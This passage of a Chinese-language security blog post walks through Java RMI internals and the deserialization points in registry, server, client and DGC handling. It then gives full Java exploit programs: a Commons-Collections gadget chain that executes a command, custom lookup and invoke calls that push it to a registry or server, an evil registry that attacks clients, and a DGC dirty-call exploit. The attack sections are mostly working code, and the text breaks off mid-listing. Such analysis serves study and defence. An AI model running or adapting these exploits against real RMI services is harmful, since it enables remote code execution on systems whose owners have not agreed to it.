<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;hello,world&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>之前分析已经知道remoteObj是一个动态代理了，那么调用它的方法时自然是走到了调用处理器类里面，跟进RemoteObjectInvocationHandler#invoke</p>
<p><img src="/images/image-20230821164912065.png" alt="image-20230821164912065"></p>
<p>进入invokeRemoteMethod方法然后进入UnicastRef里面另一个重载的invoke一样调用了executeCall</p>
<p><img src="/images/image-20230821165051039.png" alt="image-20230821165051039"></p>
<p><img src="/images/image-20230821165115119.png" alt="image-20230821165115119"></p>
<p>值得注意的是在rtype！&#x3D;void的时候会调用unmarshalValue</p>
<p><img src="/images/image-20230821165256310.png" alt="image-20230821165256310"></p>
<p>当返回值类型不是这几种基础类型时就会调用反序列化，也就是服务端可以通过返回恶意对象来攻击客户端。</p>
<p><img src="/images/image-20230821165317176.png" alt="image-20230821165317176"></p>
<h4 id="2-5、远程方法调用（服务端）"><a href="#2-5、远程方法调用（服务端）" class="headerlink" title="2.5、远程方法调用（服务端）"></a>2.5、远程方法调用（服务端）</h4><p>和在注册中心查找远程对象时候的前半段一样，来到UnicastServerRef#dispatch</p>
<p>由于skel等于null所以进入下面的流程。<img src="/images/image-20230821173247212.png" alt="image-20230821173247212"></p>
<p>我看下面的代码会发现一个眼熟的方法<img src="/images/image-20230821173531035.png" alt="image-20230821173531035"></p>
<p><img src="/images/image-20230821173829067.png" alt="image-20230821173829067"></p>
<p>那么客户端可以通过在参数值传payload来攻击服务端。</p>
<p>总结一下可能会出现的反序列化点</p>
<p>1、攻击客户端：<br>RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端<br>DGCImpl_Stub#dirty-&gt;服务端攻击客户端<br>UnicastRef#invoke-&gt;服务端攻击客户端<br>StreamRemoteCall#executeCall-&gt;服务端&#x2F;注册中心攻击客户端<br>2、攻击服务端<br>UnicastServerRef#dispatch-&gt;客户端攻击服务端<br>DGCImpl_Skel#dispatch-&gt;客户端攻击服务端<br>3、攻击注册中心<br>RegistryImpl_Skel#dispatch-&gt;客户端&#x2F;服务端攻击注册中心</p>
<h3 id="3、攻击实现"><a href="#3、攻击实现" class="headerlink" title="3、攻击实现"></a>3、攻击实现</h3><h4 id="3-1、客户端-服务端攻击注册中心"><a href="#3-1、客户端-服务端攻击注册中心" class="headerlink" title="3.1、客户端&#x2F;服务端攻击注册中心"></a>3.1、客户端&#x2F;服务端攻击注册中心</h4><p>因为注册中心和服务端在高版本 JDK 下，只能在同一台机子，所以这里就不讨论注册中心和服务端之间的互相威胁了，只讨论客户端是怎么威胁注册中心和服务端的。前面我们提到过注册中心反序列化点在RegistryImpl_Skel#dispatch.</p>
<p><img src="/images/image-20230821202725867.png" alt="image-20230821202725867"></p>
<p>实际上这里面有反序列化点的都能打。客户端传进来的 String 类型 user 就是它的参数，如果此次传的是恶意对象就有可能威胁到注册中心。这里我们关注lookup。正常使用应该是客户端调用RegistryImpl_Stub里面的lookup。</p>
<p><img src="/images/image-20230821201141212.png" alt="image-20230821201141212"></p>
<p>调用invoke将要发送的数据发送出去。客户端获取RegistryImpl_Stub了，也就获取到了里面的ref，自己实现一个lookup把恶意对象发过去就行了，不走写好的流程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.example.IRemoteObj;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="comment">//客户端攻击服务端/低版本使用</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        Object o=CC1.getCC1();</span></span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span></span><br><span class="line"><span class="comment">////        IRemoteObj remoteObj =(IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</span></span><br><span class="line"><span class="comment">//        IRemoteObj remoteObj =IRemoteObj.class.cast(Proxy.newProxyInstance(</span></span><br><span class="line"><span class="comment">//                IRemoteObj.class.getClassLoader(),</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;IRemoteObj.class&#125;,</span></span><br><span class="line"><span class="comment">//                (InvocationHandler)o));</span></span><br><span class="line"><span class="comment">//        registry.bind(&quot;sss&quot;,remoteObj);</span></span><br><span class="line"><span class="comment">//        System.out.printf(remoteObj.sayHello(&quot;hello&quot;));</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    public static void main(String[] args) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        String url = &quot;rmi://127.0.0.1:1099/remoteObj&quot;;</span></span><br><span class="line"><span class="comment">//        InitialContext initialContext = new InitialContext();</span></span><br><span class="line"><span class="comment">//        IRemoteObj remoteObj= (IRemoteObj) initialContext.lookup(url);</span></span><br><span class="line"><span class="comment">//        System.out.printf(remoteObj.sayHello(&quot;hello&quot;));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取注册表</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找对应的服务</span></span><br><span class="line">        lookup((RegistryImpl_Stub) registry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</span></span><br><span class="line"><span class="comment">//        // 调用方法</span></span><br><span class="line"><span class="comment">//        System.out.println(remoteObj.sayHello(&quot;hello,world&quot;));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">(RegistryImpl_Stub registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">RemoteObjectClass</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> RemoteObjectClass.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) refField.get(registry);</span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall(registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(genEvilMap());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">genEvilMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-2、注册中心攻击客户端"><a href="#3-2、注册中心攻击客户端" class="headerlink" title="3.2、注册中心攻击客户端"></a>3.2、注册中心攻击客户端</h4><p>这里我们看RegstyImpl_Stub#lookup,客户端会调用这个方法，我们之前提到过这里存在反序列化点。</p>
<p><img src="/images/image-20230821205001368.png" alt="image-20230821205001368"></p>
<p>也就是说，如果我们给注册中心绑定上一个恶意类，就能触发。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.RmiClient.genEvilMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilRegistry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteWrapper</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RemoteWrapper</span> <span class="keyword">implements</span> <span class="title class_">Remote</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    RemoteWrapper() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = genEvilMap();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230821205542350.png" alt="image-20230821205542350"></p>
<h4 id="3-3、客户端攻击服务端"><a href="#3-3、客户端攻击服务端" class="headerlink" title="3.3、客户端攻击服务端"></a>3.3、客户端攻击服务端</h4><p>之前我们提到过，客户端调用服务端远程对象的过程中，服务端的UnicastServerRef#dispatch会调用unmarshalValue<a href="#2.5%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%89">在这里</a>，这里可以发现可以因为都是调用unmarshalValue所以可以进行互相攻击。这里就只简单写一下客户端攻击服务端。根据unmarshalValue可知服务端接收的参数类型不能是基础类型。如果接收参数是Object，那就很简单，直接传恶意对象就行了。</p>
<p><img src="/images/image-20230821212222287.png" alt="image-20230821212222287"></p>
<p><img src="/images/image-20230821212207863.png" alt="image-20230821212207863"></p>
<p>但是当服务端没有Object参数之类的的呢。我们强制传入object会怎么样呢。答案是报错。</p>
<p><img src="/images/image-20230821213347667.png" alt="image-20230821213347667"></p>
<p>根据报错信息我们看一下能不能实现，</p>
<p><img src="/images/image-20230821213734221.png" alt="image-20230821213734221"></p>
<p>如果我们可以使hash在hashToMethod_Map里面，就能通过这个判断，之后就可以执行unmarshalValue，从而实现触发。而有个很关键的点就是 String 它不是基础类型。换句话说，如果服务段上这个 method 方法它的入参类型是 String，我们强行给它传个 Object，它也是能够反序列化成功的（前提是绕过 MethodHash 检查）。</p>
<p><code>这里不太明白，后续补上</code></p>
<p>找到计算hash的地方在RemoteObjectInvocationHandler#invoke看到了调用invokeRemoteMethod，看到了ref.invoke传递的getMethodHash(method)<img src="/../images/image-20230822175541444.png" alt="image-20230822175541444"></p>
<p><img src="/../images/image-20230822180725060.png" alt="image-20230822180725060"></p>
<p>可以看到这里我们传入的还是Object和服务端不一致。这里我们改一下值，将其改成String类型。</p>
<p><code>ClassLoader.getSystemClassLoader().loadClass(&quot;org.example.IRemoteObj&quot;).getDeclaredMethod(&quot;sayHello&quot;,String.class)</code></p>
<p><img src="/../images/image-20230822180824956.png" alt="image-20230822180824956"></p>
<p>然后跳过发现成功反序列化了。</p>
<p>贴一个白日梦组长师傅的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.RmiClient.genEvilMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClientGoServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        invoke(remoteObj);</span><br><span class="line"><span class="comment">//        remoteObj.sayCalc(genEvilMap());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(IRemoteObj remoteObj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hField</span> <span class="operator">=</span> remoteObj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;h&quot;</span>);</span><br><span class="line">        hField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> hField.get(remoteObj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) refField.get(remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> IRemoteObj.class.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methodToHash_mapsMethod</span> <span class="operator">=</span> remoteObjectInvocationHandler.getClass().getDeclaredMethod(<span class="string">&quot;getMethodHash&quot;</span>,Method.class);</span><br><span class="line">        methodToHash_mapsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> (<span class="type">long</span>) methodToHash_mapsMethod.invoke(remoteObj, method);</span><br><span class="line"></span><br><span class="line">        ref.invoke(remoteObj, method, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;genEvilMap()&#125;, hash);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码就是自己写invoke逻辑，直接将数据发送过去</p>
<p><img src="/../images/image-20230822181352230.png" alt="image-20230822181352230"></p>
<p>和前面的逻辑是一样的，invoke发送过去后服务端就会接收，不用对后面进行处理。逻辑是这么个逻辑，但是我写不出来。组长牛逼</p>
<h4 id="3-4、DGC相关的攻击"><a href="#3-4、DGC相关的攻击" class="headerlink" title="3.4、DGC相关的攻击"></a>3.4、DGC相关的攻击</h4><p>这里需要了解一下DGC的流程，之前我们提到过DGC的创建。这里我们看一下是否存在反序化点。打断点。会在DGCClient里开启的新线程可以看到里面循环调用makeDirtyCall，这里不清楚为什么调试会进不去。按照网上的说法是可以进去的。在makeDirtyCall里面会看见dgc.dirty这里调用了DGCImpl_Stub#dirty</p>
<p><img src="/../images/image-20230822202757740.png" alt="image-20230822202757740"></p>
<p>然后找到了具体点。服务端和之前类似的是差不多的先进入UnicastServerRef的dispatch</p>
<p><img src="/../images/image-20230822203238677.png" alt="image-20230822203238677"></p>
<p>因为DGCImpl_Stub是jdk内置类，所以进入oldDispatch</p>
<p><img src="/../images/image-20230822203304749.png" alt="image-20230822203304749"></p>
<p>然后进入最后进入DGCImpl_Skel#dispatch</p>
<p><img src="/../images/image-20230822203114455.png" alt="image-20230822203114455"></p>
<p>可以看到处处存在反序列化点。和我们之前提到的注册中心获取远程对象的处理的很像。所以攻击方式是不是也类似呢。</p>
<p><img src="/../images/image-20230822203428953.png" alt="image-20230822203428953"></p>
<p><strong>下面让我们开始对DGC的相关攻击进行具体的尝试。</strong></p>
<p>思路是获取DGCImpl_Stub对象，重写dirty方法，在DGCImpl_Skel#dispatch中触发反序列化，跟打注册中心的差不多，稍微麻烦点。自己创建一个恶意的DCG对象发送过去。怎么写我不会。这里贴一下一下组长的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DGCExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RegistryImpl_Stub</span> <span class="variable">registry</span> <span class="operator">=</span> (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> unicastRef.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField2</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> (LiveRef) refField2.get(unicastRef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> liveRef.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">epField</span> <span class="operator">=</span> c3.getDeclaredField(<span class="string">&quot;ep&quot;</span>);</span><br><span class="line">        epField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> (TCPEndpoint) epField.get(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.rmi.transport.DGCClient$EndpointEntry&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">lookupMethod</span> <span class="operator">=</span> c4.getDeclaredMethod(<span class="string">&quot;lookup&quot;</span>, Endpoint.class);</span><br><span class="line">        lookupMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">endpointEntry</span> <span class="operator">=</span> lookupMethod.invoke(<span class="literal">null</span>, tcpEndpoint);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> endpointEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dgcField</span> <span class="operator">=</span> c5.getDeclaredField(<span class="string">&quot;dgc&quot;</span>);</span><br><span class="line">        dgcField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">RemoteObject</span> <span class="variable">dgc</span> <span class="operator">=</span> (RemoteObject) dgcField.get(endpointEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c6</span> <span class="operator">=</span> dgc.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField3</span> <span class="operator">=</span> c6.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">unicastRef2</span> <span class="operator">=</span> (UnicastRef) refField3.get(dgc);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> unicastRef2.newCall(dgc, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">        var6.writeObject(genEvilMap());</span><br><span class="line">        unicastRef2.invoke(var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>补充一下。</p>
<p><img src="/../images/image-20230822204302470.png" alt="image-20230822204302470"></p>
<p>下面我们来一个通杀客户端的</p>
<h4 id="3-5攻击JRMP客户端"><a href="#3-5攻击JRMP客户端" class="headerlink" title="3.5攻击JRMP客户端"></a>3.5攻击JRMP客户端</h4><p>之前我们在<code>获取注册中心远程对象</code>这一节提到过，只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，</p>
<p><img src="/../images/image-20230822204816746.png" alt="image-20230822204816746"></p>
<p>攻击方法就是需要自己实现一个恶意服务端，把返回的异常信息改成payload，实这就是ysoserial里面的exploit&#x2F;JRMPListener实现的功能</p>
<p>大家可以比对一下TCPTransport#run0和JRMPListener#run的区别，还是可以看到一些联系的。具体怎么用这里就不演示了。知道可以实现对客户端的通杀。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void run0() &#123;</span><br><span class="line">    TCPEndpoint endpoint = getEndpoint();</span><br><span class="line">    int port = endpoint.getPort();</span><br><span class="line"></span><br><span class="line">    threadConnectionHandler.set(this);</span><br><span class="line"></span><br><span class="line">    // set socket to disable Nagle&#x27;s algorithm (always send</span><br><span class="line">    // immediately)</span><br><span class="line">    // TBD: should this be left up to socket factory instead?</span><br><span class="line">    try &#123;</span><br><span class="line">        socket.setTcpNoDelay(true);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        // if we fail to set this, ignore and proceed anyway</span><br><span class="line">    &#125;</span><br><span class="line">    // set socket to timeout after excessive idle time</span><br><span class="line">    try &#123;</span><br><span class="line">        if (connectionReadTimeout &gt; 0)</span><br><span class="line">            socket.setSoTimeout(connectionReadTimeout);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        // too bad, continue anyway</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream sockIn = socket.getInputStream();</span><br><span class="line">        InputStream bufIn = sockIn.markSupported()</span><br><span class="line">                ? sockIn</span><br><span class="line">                : new BufferedInputStream(sockIn);</span><br><span class="line"></span><br><span class="line">        // Read magic (or HTTP wrapper)</span><br><span class="line">        bufIn.mark(4);</span><br><span class="line">        DataInputStream in = new DataInputStream(bufIn);</span><br><span class="line">        int magic = in.readInt();</span><br><span class="line"></span><br><span class="line">        if (magic == POST) &#123;</span><br><span class="line">            